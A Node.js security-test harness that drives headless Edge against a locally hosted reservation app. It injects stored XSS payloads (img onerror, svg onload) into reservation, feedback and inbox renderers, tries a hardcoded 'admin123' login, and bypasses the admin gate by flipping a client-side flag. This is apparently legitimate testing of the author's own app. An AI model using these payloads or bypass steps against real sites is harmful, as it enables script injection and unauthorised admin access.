// Active client-side vuln test against the REAL running app via Edge DevTools (CDP).
// Zero npm deps: uses Node's built-in global WebSocket (Node 22+).
// Loads http://127.0.0.1:8000/index.html, exercises the app's own functions,
// and reports whether attacker-controlled data executes JS (stored/DOM XSS),
// plus client-side admin-auth bypass.
const { spawn } = require('node:child_process');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
const fs = require('node:fs');

const EDGE = 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe';
const TARGET = 'http://127.0.0.1:8000/index.html';
const PORT = 9222;
const userDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sectest-edge-'));

function getJSON(url) {
  return new Promise((resolve, reject) => {
    http.get(url, (res) => {
      let d = ''; res.on('data', c => d += c); res.on('end', () => resolve(JSON.parse(d)));
    }).on('error', reject);
  });
}
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function findPageWs() {
  for (let i = 0; i < 40; i++) {
    try {
      const list = await getJSON(`http://127.0.0.1:${PORT}/json/list`);
      const page = list.find(t => t.type === 'page' && t.webSocketDebuggerUrl);
      if (page) return page.webSocketDebuggerUrl;
    } catch (_) {}
    await sleep(250);
  }
  throw new Error('No CDP page target found');
}

function cdp(ws) {
  let id = 0; const pending = new Map();
  ws.addEventListener('message', ev => {
    const msg = JSON.parse(ev.data);
    if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg); pending.delete(msg.id); }
  });
  return (method, params = {}) => new Promise((resolve) => {
    const mid = ++id; pending.set(mid, resolve);
    ws.send(JSON.stringify({ id: mid, method, params }));
  });
}

async function evaluate(send, expression) {
  const r = await send('Runtime.evaluate', {
    expression, awaitPromise: true, returnByValue: true, allowUnsafeEvalBlocklisting: true,
  });
  if (r.result && r.result.exceptionDetails) return { error: r.result.exceptionDetails };
  if (r.exceptionDetails) return { error: r.exceptionDetails.text };
  return { value: r.result && r.result.result && r.result.result.value !== undefined
    ? r.result.result.value : (r.result && r.result.value) };
}

(async () => {
  const edge = spawn(EDGE, [
    '--headless=new', '--disable-gpu', '--no-first-run', '--no-default-browser-check',
    `--remote-debugging-port=${PORT}`, `--user-data-dir=${userDir}`, TARGET,
  ], { stdio: 'ignore' });

  try {
    const wsUrl = await findPageWs();
    const ws = new WebSocket(wsUrl);
    await new Promise((res, rej) => { ws.addEventListener('open', res); ws.addEventListener('error', rej); });
    const send = cdp(ws);
    await send('Runtime.enable');
    await send('Page.enable');
    await sleep(1500); // let inline scripts define globals

    // ---- TEST 1: Stored/DOM XSS via renderReservations (admin dashboard) ----
    // NOTE: assign the LEXICAL global `reservations` (no window. prefix) so the
    // render function actually reads our attacker-controlled row.
    const t1 = await evaluate(send, `(async () => {
      window.__xss = { res:0, fb:0, inbox:0 };
      const c = document.createElement('div'); c.id='__sectest_res'; document.body.appendChild(c);
      reservations = [{
        id:'SECTEST', name:'<img src=x onerror="window.__xss.res++">',
        phone:'1', email:'a@b.com',
        date:'2026-07-01', time:'19:00', guests:2, occasion:'Regular',
        handiType:'', address:'', status:'pending'
      }];
      if (typeof renderReservations !== 'function') return {err:'renderReservations missing'};
      renderReservations(c);
      await new Promise(r=>setTimeout(r,500));
      const cell = c.querySelector('td:nth-child(2)');
      return { fired: window.__xss.res, sink:'renderReservations -> innerHTML',
        nameCellHasLiveImg: !!(cell && cell.querySelector('img')),
        evidence: cell ? cell.innerHTML.slice(0,80) : null };
    })()`);

    // ---- TEST 2: Stored XSS via renderFeedback ----
    const t2 = await evaluate(send, `(async () => {
      const c = document.createElement('div'); c.id='__sectest_fb'; document.body.appendChild(c);
      feedbacks = [{ id:'SECTEST', customer:'<svg onload="window.__xss.fb++">',
        phone:'1', rating:5, text:'<img src=x onerror="window.__xss.fb++">', date:'2026-07-01' }];
      if (typeof renderFeedback !== 'function') return {err:'renderFeedback missing'};
      renderFeedback(c);
      await new Promise(r=>setTimeout(r,500));
      return { fired: window.__xss.fb, sink:'renderFeedback -> innerHTML',
        liveNodes: c.querySelectorAll('svg,img').length };
    })()`);

    // ---- TEST 3: Stored XSS via renderInbox (customer inbox notices) ----
    const t3 = await evaluate(send, `(async () => {
      const el = document.getElementById('inboxList') || (()=>{const d=document.createElement('div');d.id='inboxList';document.body.appendChild(d);return d;})();
      inboxCache = [{ id:'SECTEST', title:'<img src=x onerror="window.__xss.inbox++">',
        body:'<img src=x onerror="window.__xss.inbox++">', date:Date.now(), read:false }];
      if (typeof renderInbox !== 'function') return {err:'renderInbox missing'};
      renderInbox();
      await new Promise(r=>setTimeout(r,500));
      return { fired: window.__xss.inbox, sink:'renderInbox -> innerHTML',
        liveNodes: el.querySelectorAll('img').length };
    })()`);

    // ---- TEST 4: Admin auth = hardcoded plaintext creds in client ----
    const t4 = await evaluate(send, `(() => {
      const accounts = (typeof ADMIN_ACCOUNTS !== 'undefined') ? ADMIN_ACCOUNTS : null;
      let loginWorks = null;
      try { loginWorks = (typeof loginAdminFromHeader==='function')
        ? loginAdminFromHeader('admin','admin123') : 'fn-missing'; } catch(e){ loginWorks = 'threw:'+e.message; }
      return { exposedCreds: accounts, defaultLoginAccepted: loginWorks };
    })()`);

    // ---- TEST 5: Admin gate bypass with NO credentials (flip global + open panel) ----
    const t5 = await evaluate(send, `(() => {
      try {
        window.adminLoggedIn = true;       // global guard is client-side only
        if (typeof openAdminPanel === 'function') openAdminPanel();
        const dash = document.getElementById('adminDashboard');
        const visible = dash ? getComputedStyle(dash).display : 'no-el';
        return { adminLoggedIn: window.adminLoggedIn, dashboardDisplay: visible };
      } catch(e){ return { err: e.message }; }
    })()`);

    const results = { target: TARGET, when: new Date().toISOString(),
      test1_reservations_xss: t1.value || t1.error,
      test2_feedback_xss: t2.value || t2.error,
      test3_inbox_xss: t3.value || t3.error,
      test4_admin_hardcoded_creds: t4.value || t4.error,
      test5_admin_gate_bypass: t5.value || t5.error };

    console.log(JSON.stringify(results, null, 2));
    fs.writeFileSync(path.join(__dirname, 'xss_active_results.json'), JSON.stringify(results, null, 2));
    ws.close();
  } catch (e) {
    console.error('HARNESS ERROR:', e.message);
  } finally {
    edge.kill();
    try { fs.rmSync(userDir, { recursive: true, force: true }); } catch (_) {}
  }
})();
